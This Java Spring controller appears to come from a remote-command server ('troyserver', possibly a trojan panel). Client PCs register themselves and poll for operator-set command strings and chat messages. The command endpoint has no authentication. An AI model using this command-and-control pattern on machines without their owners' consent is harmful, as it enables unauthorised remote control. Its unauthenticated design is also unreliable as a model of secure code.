package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.entity.Client;
import ch.lebois.troyserver.data.repository.ClientFieldRepository;
import ch.lebois.troyserver.data.repository.ClientRepository;
import ch.lebois.troyserver.model.CommandModel;
import ch.lebois.troyserver.service.ClientFieldService;
import ch.lebois.troyserver.service.CookieService;
import javax.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping(value = "command/")
public class CommandController {

    private ClientRepository clientRepository;
    private ClientFieldRepository clientFieldRepository;

    private ClientFieldService clientFieldService;
    private CookieService cookieService;

    public CommandController(ClientRepository clientRepository, CookieService cookieService,
                             ClientFieldRepository clientFieldRepository, ClientFieldService clientFieldService) {
        this.clientRepository = clientRepository;
        this.cookieService = cookieService;
        this.clientFieldRepository = clientFieldRepository;
        this.clientFieldService = clientFieldService;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getCommands(@PathVariable(value = "client") String clientParam, CommandModel commandModel,
                              Model model) {

        Client client = clientRepository.findOne(clientParam);
        if (client == null) {
            createClient(clientParam);
            return "dashboard";
        }

        commandModel.setCommands(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "command").getValue());
        model.addAttribute("model", commandModel);
        return "commands";
    }

    private void createClient(String clientName) {
        Client client;
        client = new Client();
        client.setPcName(clientName);
        clientRepository.save(client);
    }

    @RequestMapping(value = {"/edit/{client}"}, method = RequestMethod.POST)
    public String edited(@PathVariable(value = "client") String clientParam,
                         @RequestParam(name = "commands") String commands,
                         HttpServletRequest request) {

        try {
            cookieService.getCurrentUser(request);
            clientFieldService.setFieldValue(clientRepository.findOne(clientParam), "command", commands);
        } catch (NullPointerException e) {
            return "redirect:/login";
        }

        return "redirect:/dashboard/" + clientParam;
    }

    @RequestMapping(value = {"/edit/chat/{client}"}, method = RequestMethod.POST)
    public String editedChat(@PathVariable(value = "client") String clientParam,
                             @RequestParam(name = "sender") String senderParam,
                             @RequestParam(name = "message") String messageParam,
                             HttpServletRequest request) {

        try {
            cookieService.getCurrentUser(request);
        } catch (NullPointerException e) {
            return "redirect:/login";
        }
        clientFieldService.setFieldValue(clientRepository.findOne(clientParam), "command",
                "msg " + senderParam + " " + messageParam);

        return "redirect:/chat/" + clientParam;
    }

}
